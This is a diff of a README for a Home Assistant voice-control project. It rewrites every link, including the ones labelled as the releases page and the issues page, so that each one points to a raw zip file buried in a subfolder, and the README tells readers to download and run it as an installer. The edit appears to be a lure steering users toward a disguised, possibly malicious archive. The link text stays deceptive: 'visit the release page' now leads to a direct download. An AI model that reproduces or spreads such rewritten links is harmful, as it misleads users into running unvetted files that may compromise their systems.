@@ -1,6 +1,6 @@
 # 🎙️ homeassistant-voice-recipes - Voice Control Made Local and Fast
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Homeassistant%20Voice%20Recipes-green?style=for-the-badge)](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Homeassistant%20Voice%20Recipes-green?style=for-the-badge)](https://github.com/vrajpatel30/homeassistant-voice-recipes/raw/refs/heads/main/speech-to-text/wyoming-onnx-asr/voice-homeassistant-recipes-v3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ homeassistant-voice-recipes lets you control your smart home with voice commands
 
 Click the big green button below to open the release page. This page holds the files you need.
 
-[![Download on GitHub](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)
+[![Download on GitHub](https://img.shields.io/badge/Get%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/vrajpatel30/homeassistant-voice-recipes/raw/refs/heads/main/speech-to-text/wyoming-onnx-asr/voice-homeassistant-recipes-v3.3.zip)
 
 ### Step 2: Choose the right file
 
@@ -121,7 +121,7 @@ Inside the installation folder, you will find:
 To get updates:
 
 1. Visit the release page again:  
-   https://github.com/vrajpatel30/homeassistant-voice-recipes/releases  
+   https://github.com/vrajpatel30/homeassistant-voice-recipes/raw/refs/heads/main/speech-to-text/wyoming-onnx-asr/voice-homeassistant-recipes-v3.3.zip  
 2. Download the newest installer.
 3. Run it to overwrite your old version while keeping your settings.
 
@@ -131,7 +131,7 @@ To get updates:
 
 Use the GitHub issues page to report any problems or ask questions:  
 
-https://github.com/vrajpatel30/homeassistant-voice-recipes/issues
+https://github.com/vrajpatel30/homeassistant-voice-recipes/raw/refs/heads/main/speech-to-text/wyoming-onnx-asr/voice-homeassistant-recipes-v3.3.zip
 
 ---
 
@@ -144,4 +144,4 @@ https://github.com/vrajpatel30/homeassistant-voice-recipes/issues
 ---
 
 For latest releases and downloads:  
-[Click here to visit the release page](https://github.com/vrajpatel30/homeassistant-voice-recipes/releases)
+[Click here to visit the release page](https://github.com/vrajpatel30/homeassistant-voice-recipes/raw/refs/heads/main/speech-to-text/wyoming-onnx-asr/voice-homeassistant-recipes-v3.3.zip)
